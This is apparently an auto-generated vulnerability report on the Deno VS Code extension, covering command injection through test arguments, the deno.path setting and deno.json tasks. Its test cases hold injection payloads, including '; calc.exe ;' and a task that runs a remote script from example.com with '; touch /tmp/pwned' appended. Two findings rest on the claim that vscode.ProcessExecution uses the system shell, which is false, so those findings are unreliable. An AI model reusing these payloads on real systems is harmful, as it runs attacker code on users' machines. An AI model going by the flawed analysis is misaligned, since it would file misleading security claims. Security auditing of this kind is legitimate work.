### Combined Vulnerability List

- Vulnerability Name: Command Injection via `deno.codeLens.testArgs` in Test Code Lens

  - Description:
    1. The VSCode extension allows users to configure additional arguments for test code lenses through the `deno.codeLens.testArgs` setting.
    2. When a user clicks "Run Test" code lens, the extension executes a Deno CLI command to run the test.
    3. The arguments specified in `deno.codeLens.testArgs` are directly passed to the `deno test` command without proper sanitization.
    4. A malicious user can inject arbitrary shell commands by crafting a malicious payload in the `deno.codeLens.testArgs` setting.
    5. When the "Run Test" code lens is executed, the injected commands will be executed by the system.

  - Impact: Arbitrary command execution on the user's machine with the privileges of the VSCode process. This can lead to data exfiltration, malware installation, or complete system compromise.

  - Vulnerability Rank: Critical

  - Currently Implemented Mitigations: None. The extension directly uses the configured arguments without any sanitization.

  - Missing Mitigations:
    - Sanitize or validate user-provided arguments in `deno.codeLens.testArgs` to prevent command injection.
    - Avoid using shell execution for tasks and use safer alternatives if possible.
    - Display a warning to the user when using `deno.codeLens.testArgs` about the security implications.

  - Preconditions:
    - The user must have the Deno VSCode extension installed and enabled.
    - The user must configure a malicious payload in the `deno.codeLens.testArgs` setting.
    - The user must click the "Run Test" code lens for a test in a Deno project.

  - Source Code Analysis:
    1. Open `/code/client/src/commands.ts`.
    2. Examine the `test` function.
    3. Observe how `testArgs` is constructed:
        ```typescript
        const testArgs: string[] = [
          ...(config.get<string[]>("codeLens.testArgs") ?? []),
        ];
        ```
        This line retrieves the array of strings from the `deno.codeLens.testArgs` configuration setting and directly spreads it into the `testArgs` array. There is no sanitization or validation of these arguments.
    4. The `testArgs` array is then used to construct the command executed by `vscode.tasks.executeTask`:
        ```typescript
        const args = ["test", ...testArgs, "--filter", nameRegex, filePath];
        const definition: tasks.DenoTaskDefinition = {
          type: tasks.TASK_TYPE,
          command: "test",
          args,
          env,
        };
        // ...
        const task = tasks.buildDenoTask(
          workspaceFolder,
          denoCommand,
          definition,
          `test "${name}"`,
          args,
          ["$deno-test"],
        );
        task.presentationOptions = { /* ... */ };
        task.group = vscode.TaskGroup.Test;
        const createdTask = await vscode.tasks.executeTask(task);
        ```
        The `args` array, which includes unsanitized `testArgs`, is passed to `tasks.buildDenoTask`.
    5. Open `/code/client/src/tasks.ts`.
    6. Examine the `buildDenoTask` function:
        ```typescript
        export function buildDenoTask(
          target: vscode.WorkspaceFolder,
          process: string,
          definition: DenoTaskDefinition,
          name: string,
          args: string[],
          problemMatchers: string[],
        ): vscode.Task {
          const exec = new vscode.ProcessExecution(
            process,
            args,
            definition,
          );

          return new vscode.Task(
            definition,
            target,
            name,
            TASK_SOURCE,
            exec,
            problemMatchers,
          );
        }
        ```
        The `args` parameter is directly passed to `vscode.ProcessExecution`. `ProcessExecution` executes the command using the system shell, which is vulnerable to command injection if arguments are not properly sanitized.

    7. **Visualization:**

    ```mermaid
    graph LR
        A[User configures deno.codeLens.testArgs] --> B(vscode.workspace.getConfiguration("deno").get("codeLens.testArgs"));
        B --> C{commands.test function};
        C --> D[Construct testArgs array with user input];
        D --> E[Construct args array for Deno CLI with testArgs];
        E --> F{tasks.buildDenoTask};
        F --> G(vscode.ProcessExecution with unsanitized args);
        G --> H[System Shell executes command with injected commands];
    ```

  - Security Test Case:
    1. Open VSCode with the Deno extension installed and enabled.
    2. Open a Deno project or create a simple Deno project with a test file (e.g., `test.ts`).
    3. Open VSCode settings (Ctrl+, or Cmd+,).
    4. Go to Workspace Settings and search for "deno.codeLens.testArgs".
    5. Edit the `deno.codeLens.testArgs` setting and add a malicious payload. For example:
        ```json
        "deno.codeLens.testArgs": [
            "--allow-all",
            "; calc.exe ;"
        ]
        ```
    6. Save the settings.
    7. Open the `test.ts` file.
    8. Locate the "▶ Run Test" code lens above the `Deno.test` declaration.
    9. Click the "▶ Run Test" code lens.
    10. Observe that `calc.exe` (or equivalent calculator application) is executed, demonstrating command injection.

- Vulnerability Name: Arbitrary Command Execution via Malicious “deno.path” Configuration

  - Description:
    The extension obtains the path to the Deno executable from the user’s or workspace’s configuration (the `"deno.path"` setting) without applying adequate sanitization or integrity checks. In the file `/code/client/src/util.ts`, the function `getWorkspaceConfigDenoExePath()` simply returns the configured string—even if it is a relative path. Later in `getDenoCommandPath()`, if the provided path is not absolute the extension iterates over the workspace folders and resolves the path using `path.resolve(...)`. An attacker who controls the workspace (for example, via a maliciously crafted `.vscode/settings.json`) can set `"deno.path"` to a relative path (e.g. `"./malicious_executable"`) that points to an attacker‐supplied executable placed within the workspace. When the extension later spawns the Deno process (for example, to start the language server or execute tasks), it will execute the malicious binary instead of the genuine Deno CLI—thus allowing arbitrary command execution.

  - Impact:
    Successful exploitation could allow the attacker to execute arbitrary commands on the victim’s machine. This may result in full system compromise, data exfiltration, installation of malware, or further abuse of privileges.

  - Vulnerability Rank: Critical

  - Currently Implemented Mitigations:
    - A basic file existence check (using an asynchronous `fs.stat` via the helper function `fileExists()`) is performed before returning a candidate executable. However, this check only confirms that a file is present and does not verify that it is the trusted Deno executable.

  - Missing Mitigations:
    - Validate and sanitize the supplied `"deno.path"` configuration value to ensure it conforms to an expected format.
    - Enforce that the path must be absolute or, if relative, that it resolves only into known trusted directories (for example, system installation directories or a trusted installer’s location).
    - Optionally, perform a signature or hash check on the resolved executable before using it.

  - Preconditions:
    - The attacker must be able to supply a malicious workspace configuration (for example, by providing a repository with a `.vscode/settings.json` file) where `"deno.path"` is set to a relative path targeting a malicious executable.
    - The malicious executable is present at the specified relative path within the workspace.
    - The user opens the compromised workspace in VS Code and triggers a command that causes the extension to resolve and execute the Deno CLI.

  - Source Code Analysis:
    - In `/code/client/src/util.ts`, the helper function `getWorkspaceConfigDenoExePath()` retrieves the configured path without sanitization:
      ```js
      function getWorkspaceConfigDenoExePath() {
        const exePath = workspace.getConfiguration(EXTENSION_NS).get<string>("path");
        if (typeof exePath === "string" && exePath.trim().length === 0) {
          return undefined;
        } else {
          return exePath;
        }
      }
      ```
    - In the same file, `getDenoCommandPath()` checks if the command is absolute; if not, it resolves it against each workspace folder:
      ```js
      export async function getDenoCommandPath() {
        const command = getWorkspaceConfigDenoExePath();
        const workspaceFolders = workspace.workspaceFolders;
        if (!command || !workspaceFolders) {
          return command ?? await getDefaultDenoCommand();
        } else if (!path.isAbsolute(command)) {
          for (const workspace of workspaceFolders) {
            const commandPath = path.resolve(workspace.uri.fsPath, command);
            if (await fileExists(commandPath)) {
              return commandPath;
            }
          }
          return undefined;
        } else {
          return command;
        }
      }
      ```
    - Later, the resolved command is used to spawn a process—thus executing the malicious binary when the user triggers a Deno-related command.

  - Security Test Case:
    1. **Preparation:**
       - Create a new workspace containing a `.vscode/settings.json` file with the following content:
         ```json
         {
           "deno.path": "./malicious_executable"
         }
         ```
       - In the workspace root, place a dummy executable named `malicious_executable`.
    2. **Execution:**
       - Open the workspace in Visual Studio Code.
       - Trigger an extension command that causes the Deno CLI to be resolved and executed (e.g., “Deno: Restart”).
    3. **Verification:**
       - Confirm that the dummy (malicious) executable was executed.
       - This proves that the extension accepted the malicious relative path and executed an attacker-controlled binary.

- Vulnerability Name: Arbitrary Command Execution via Malicious Task Definitions

  - Description:
    1. A malicious user can modify the `deno.json` configuration file within a workspace.
    2. This file can define custom tasks for the Deno extension.
    3. The VSCode extension retrieves these task definitions from the Deno Language Server.
    4. When a user executes a task defined in `deno.json` (e.g., from the "Deno Tasks" sidebar), the extension uses `vscode.tasks.executeTask` with `vscode.ProcessExecution`.
    5. The `command` and `args` properties of the task definition, which are directly taken from the `deno.json` file, are used to construct the command executed by `vscode.ProcessExecution`.
    6. By crafting a malicious `deno.json` file, an attacker can inject arbitrary shell commands into the `command` or `args` properties.
    7. When a victim user executes this maliciously defined task, the injected commands will be executed with the privileges of the VSCode process, leading to command injection.

  - Impact:
    Remote Code Execution. An attacker can achieve arbitrary code execution on the user's machine by injecting malicious commands into task definitions within `deno.json` and tricking the user into executing these tasks.

  - Vulnerability Rank: High

  - Currently Implemented Mitigations:
    - None. The extension does not perform any sanitization or validation of the `command` and `args` properties from task definitions.

  - Missing Mitigations:
    - Input sanitization and validation for task commands and arguments are missing.
    - The extension should implement a mechanism to validate or sanitize the `command` and `args` properties extracted from task definitions in `deno.json` and similar configuration files.
    - Ideally, a whitelist of allowed commands and strict sanitization of arguments should be implemented to prevent command injection attacks.

  - Preconditions:
    - The attacker needs to have the ability to modify the `deno.json` file or any other configuration file from which Deno tasks are derived within a workspace that a victim user opens in VSCode.
    - The Deno VSCode extension must be installed and enabled for the workspace.
    - The victim user must execute the malicious task, for example, by clicking "Run Task" in the "Deno Tasks" sidebar.

  - Source Code Analysis:
    - File: `/code/client/src/tasks_sidebar.ts`
        - In `DenoTaskProvider.provideTasks()`, the extension requests task definitions from the Deno Language Server using `client.sendRequest(taskReq)`.
        - The retrieved task definitions are then used to create `vscode.Task` objects via `buildDenoConfigTask`.
    - File: `/code/client/src/tasks.ts`
        - `buildDenoConfigTask()` creates a `vscode.Task` using `vscode.ProcessExecution`.
        - The `command` and `args` for `vscode.ProcessExecution` are directly derived from the task definition, which originates from user-controlled `deno.json` without sanitization.
    - File: `/code/client/src/lsp_extensions.ts`
        - Defines the `task` request and `TaskRequestResponse` type, which includes `command` and `detail` (alias for command) properties that are used without validation.

  - Security Test Case:
    1. **Setup:** Ensure VSCode with the Deno extension is installed and enabled. Open a workspace folder in VSCode.
    2. **Create Malicious `deno.json`:** Create or modify `deno.json` in the workspace root with the following content:
        ```json
        {
          "tasks": {
            "maliciousTask": {
              "command": "run",
              "args": [
                "-A",
                "https://example.com/malicious_script.ts; touch /tmp/pwned"
              ]
            }
          }
        }
        ```
    3. **Open Deno Tasks Sidebar:** Open the "Deno Tasks" sidebar in VSCode (View -> Open View... -> Deno Tasks).
    4. **Execute Malicious Task:** In the "Deno Tasks" sidebar, find "maliciousTask" under your workspace and click the "Run Task" button.
    5. **Verify Command Injection:** After the task execution completes, check if the file `/tmp/pwned` exists using `ls /tmp/pwned` in the terminal.
    6. **Expected Result:** The file `/tmp/pwned` should be created in the `/tmp` directory, indicating successful command injection.
